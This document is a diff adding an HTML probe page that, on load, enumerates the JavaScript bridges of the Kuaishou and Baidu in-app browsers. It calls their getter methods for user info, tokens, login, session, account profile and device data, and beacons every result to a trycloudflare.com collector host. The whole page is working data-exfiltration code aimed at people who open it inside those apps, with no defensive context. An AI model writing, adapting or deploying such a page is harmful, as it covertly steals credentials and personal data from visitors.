@@ -1,0 +1,80 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>P3</title>
+<style>body{font-family:monospace;font-size:12px;word-break:break-all;margin:4px;background:#111;color:#0f0}pre{white-space:pre-wrap;margin:1px 0;font-size:10px}h1{color:#ff0;font-size:18px;margin:2px 0}</style>
+</head>
+<body>
+<h1>PROBE3-INVOKE</h1>
+<pre id="out">...</pre>
+<script>
+var COLLECTOR = 'https://waters-finances-wrestling-marked.trycloudflare.com';
+var LOG = [];
+function out(s){ LOG.push(String(s)); document.getElementById('out').textContent = LOG.join('\n').substring(0,3000); }
+function report(tag, data){
+  var p = {page:'probe3', tag:tag, url:location.href, data:data, ua:navigator.userAgent};
+  var qs = encodeURIComponent(JSON.stringify(p));
+  try{ navigator.sendBeacon(COLLECTOR+'/b?d='+qs); }catch(e){}
+  try{ new Image().src = COLLECTOR+'/i?d='+qs; }catch(e){}
+}
+function safe(fn, name){ try{ return fn(); }catch(e){ out('ERR '+name+': '+e); return undefined; } }
+
+setTimeout(function(){
+  out('t=' + Date.now());
+
+  // ---- Kuaishou ----
+  var Kwai = window.Kwai;
+  if (Kwai){
+    var keys = safe(function(){ return Object.keys(Kwai); }, 'kwai-keys') || [];
+    report('kwai-all-keys', keys);
+    out('Kwai keys total: ' + keys.length);
+    // read-only candidates
+    var cand = keys.filter(function(k){ return /^get/i.test(k) && /user|token|login|passport|session|info|device|clip|env|abtest|log|book/i.test(k); });
+    out('kwai candidates: ' + cand.join(','));
+    cand.forEach(function(m){
+      safe(function(){
+        var r = Kwai[m](function(x){ out(m+' cb: '+JSON.stringify(x)); report('kwai-cb-'+m, x); });
+        if (r !== undefined && r !== null){ out(m+' sync: '+String(r).substring(0,600)); report('kwai-sync-'+m, String(r).substring(0,1500)); }
+      }, 'kwai-'+m);
+    });
+  }
+  // yoda common data (plain object, may embed user/device ids)
+  safe(function(){ var d = window.__yodaCommonDataObject__ && window.__yodaCommonDataObject__.pageLoadData; if (d){ var s = JSON.stringify(d); out('pageLoadData: '+s.substring(0,500)); report('yoda-pageLoadData', s.substring(0,3000)); } }, 'yoda-data');
+  // yoda invoke getUserInfo family
+  var yoda = window.__yodaBridge__;
+  if (yoda){
+    ['user.getUserInfo','getUserInfo','app.getAppInfo','device.getDeviceInfo','common.getCommonParameters'].forEach(function(api){
+      safe(function(){ yoda.invoke(api, {}, function(res){ out('yoda '+api+' cb: '+JSON.stringify(res).substring(0,400)); report('yoda3-'+api, res); }); }, 'yoda-'+api);
+    });
+  }
+
+  // ---- Baidu ----
+  safe(function(){
+    var acc = window.Bdbox_android_account;
+    if (acc){
+      var prof = acc.profile;
+      var s = (typeof prof === 'function') ? String(safe(function(){ return prof(); }, 'profile()')) : JSON.stringify(prof);
+      out('account.profile: ' + String(s).substring(0,500));
+      report('bd-account-profile', String(s).substring(0,3000));
+    }
+  }, 'bd-acc');
+  ['Bdbox_android_utils','Bdbox_android_feed','bd_searchbox_interface'].forEach(function(ns){
+    safe(function(){
+      var o = window[ns]; if (!o) return;
+      var methods = ['getDeviceInfo','currPageUrl','getGlobalSettings','getNetInfo','getContextInfo','getNativeAppStatus','getABTestInfo','paramsRender'];
+      methods.forEach(function(m){
+        if (typeof o[m] === 'function'){
+          safe(function(){
+            var r = o[m](function(x){ out(ns+'.'+m+' cb: '+JSON.stringify(x).substring(0,400)); report('bd-cb-'+ns+'.'+m, x); });
+            if (r !== undefined && r !== null && typeof r !== 'function'){ out(ns+'.'+m+' sync: '+String(r).substring(0,600)); report('bd-sync-'+ns+'.'+m, String(r).substring(0,1500)); }
+          }, ns+'.'+m);
+        }
+      });
+    }, ns);
+  });
+
+  out('done3');
+  report('done3', {log: LOG.slice(0,80)});
+}, 300);
+</script>
+</body>
+</html>
